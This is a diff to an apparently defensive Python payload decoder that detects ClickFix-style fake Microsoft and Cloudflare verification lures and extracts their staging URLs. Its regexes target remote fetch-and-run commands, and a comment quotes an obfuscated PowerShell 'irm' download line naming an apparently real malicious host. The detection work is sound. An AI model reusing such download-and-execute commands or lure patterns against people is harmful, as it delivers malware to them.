@@ -42,8 +42,9 @@ class PayloadDecoder:
 
     @classmethod
     def decode_powershell(cls, text: str) -> list[str]:
-        """Decodes PowerShell UTF-16LE encoded commands and extracts URLs"""
+        """Decodes PowerShell encoded or plain irm/iex commands and extracts URLs"""
         found_urls = []
+        # 1. Base64 UTF-16LE encoded commands
         match = cls.PS_ENC_PATTERN.search(text)
         if match:
             try:
@@ -56,7 +57,123 @@ class PayloadDecoder:
                 found_urls.extend(urls)
             except Exception:
                 pass
+
+        # 2. Plain irm / iex / DownloadString
+        plain_urls = re.findall(r"(?:irm|iwr|Invoke-RestMethod|Invoke-WebRequest|DownloadString|DownloadFile)\s*(?:['\"]|\(\s*['\"])(https?://[^'\"\s\)]+)", text, re.IGNORECASE)
+        for u in plain_urls:
+            u_clean = u.replace(r"\/", "/")
+            if "." in u_clean.split("://")[-1]:
+                found_urls.append(u_clean)
+
         return list(set(found_urls))
+
+    @classmethod
+    def decode_cfmd_captcha(cls, dom_or_js: str) -> dict:
+        """
+        Detects and decodes the __cfmdCaptcha / ClickFix lure framework:
+        1. Fake Microsoft Account / Cloudflare verification dialogs
+        2. In-line COMMANDS object: PowerShell (Windows) and curl/bash (macOS)
+        3. String concatenation & PowerShell -f format deobfuscation
+        4. Staging URLs with custom X-WUA headers and WUA/ user agents
+        5. Secondary batch/zip downloaders (KL.bat, KL.zip, KL.exe)
+        """
+        result = {
+            "is_cfmd": False,
+            "lure_type": None,
+            "staging_urls": [],
+            "live_c2_url": None,
+            "delivery_url": None,
+            "wua_token": None
+        }
+
+        has_cfmd = "__cfmdCaptcha" in dom_or_js
+        has_commands = 'COMMANDS = {"windows":' in dom_or_js or 'COMMANDS = {windows:' in dom_or_js
+        has_wua = "X-WUA" in dom_or_js or "WUA/" in dom_or_js
+        has_kl = "KL.bat" in dom_or_js or "KL.zip" in dom_or_js or "verify-page.js" in dom_or_js
+        has_lom = "/lom/" in dom_or_js or "/lom_p2/" in dom_or_js or "/hex/lom/" in dom_or_js
+
+        if not (has_cfmd or has_commands or has_wua or has_kl or has_lom):
+            return result
+
+        result["is_cfmd"] = True
+        if "MICROSOFT ACCOUNT" in dom_or_js or "ms_verify_you" in dom_or_js or "Confirm this sign-in" in dom_or_js:
+            result["lure_type"] = "Fake Microsoft Account Verification"
+        elif "cf_verify_action" in dom_or_js or "Verify you are human" in dom_or_js or "cf_needs_review" in dom_or_js:
+            result["lure_type"] = "Fake Cloudflare Verification"
+        elif has_kl:
+            result["lure_type"] = "Fake Cloudflare / Batch Dropper"
+        else:
+            result["lure_type"] = "ClickFix Verification Dialog"
+
+        wua_m = re.search(r"WUA/([a-zA-Z0-9_-]+)", dom_or_js)
+        if wua_m:
+            result["wua_token"] = wua_m.group(1)
+
+        urls = set()
+
+        # Format A: Plain irm 'https://...'
+        plain_m = re.findall(r"irm\s+['\"](https?://[^'\"\s\)]+)['\"]", dom_or_js, re.IGNORECASE)
+        for u in plain_m:
+            u_c = u.replace(r"\/", "/")
+            if "." in u_c.split("://")[-1]:
+                urls.add(u_c)
+
+        # Format B: irm (('{0}{1}' -f 'h','ttps://')+('inte'+'rnetserchinkas.co')+'/hex/lom/84aa3f59')
+        f_matches = re.finditer(r"irm\s+\(\s*([^\)]+-[^\)]+)\)", dom_or_js, re.IGNORECASE)
+        for fm in f_matches:
+            expr = fm.group(1)
+            f_op = re.search(r"'([^']*)'\s*-f\s*([^\)]+)", expr)
+            prefix = ""
+            if f_op:
+                fmt = f_op.group(1)
+                args = re.findall(r"'([^']*)'", f_op.group(2))
+                try:
+                    prefix = fmt.format(*args)
+                except Exception:
+                    prefix = "".join(args)
+                expr = expr[f_op.end():]
+            rem = re.findall(r"'([^']*)'", expr)
+            full_url = (prefix + "".join(rem)).replace(r"\/", "/")
+            if full_url.startswith("http") and "." in full_url.split("://")[-1]:
+                urls.add(full_url)
+
+        # Format C: macOS echo base64 | bash
+        b64_mac = re.findall(r"echo\s+['\"]?([A-Za-z0-9+/=]{20,})['\"]?\s*\|\s*base64\s+-d", dom_or_js)
+        for b in b64_mac:
+            try:
+                dec = base64.b64decode(b).decode("utf-8", errors="ignore")
+                for uf in re.findall(r"https?://[^\s'\"<>]+", dec):
+                    uf_c = uf.replace(r"\/", "/")
+                    if "." in uf_c.split("://")[-1]:
+                        urls.add(uf_c)
+            except Exception:
+                pass
+
+        # Format D: Direct script injection (interseq.at/lom_p2/api?_v=...)
+        interseq_m = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:lom_p2/api|verify-page\.js|KL\.bat|KL\.zip)[^\s'\"<>]*", dom_or_js)
+        for u in interseq_m:
+            u_c = u.replace(r"\/", "/")
+            if "." in u_c.split("://")[-1]:
+                urls.add(u_c)
+
+        # Format E: Direct /lom/ or /h/ or /hex/ URLs
+        direct_lom = re.findall(r"https?://[a-zA-Z0-9.-]+/(?:lom|h|hex/lom)/[a-f0-9]+", dom_or_js)
+        for u in direct_lom:
+            u_c = u.replace(r"\/", "/")
+            if "." in u_c.split("://")[-1]:
+                urls.add(u_c)
+
+        clean_urls = list(urls)
+        result["staging_urls"] = clean_urls
+        for u in clean_urls:
+            dom = u.split("://")[-1].split("/")[0].split(":")[0]
+            if not result["live_c2_url"]:
+                result["live_c2_url"] = f"https://{dom}"
+            if not result["delivery_url"]:
+                result["delivery_url"] = u
+
+        return result
+
 
     @classmethod
     def decode_clearfake_js(cls, dom_or_js: str) -> dict:
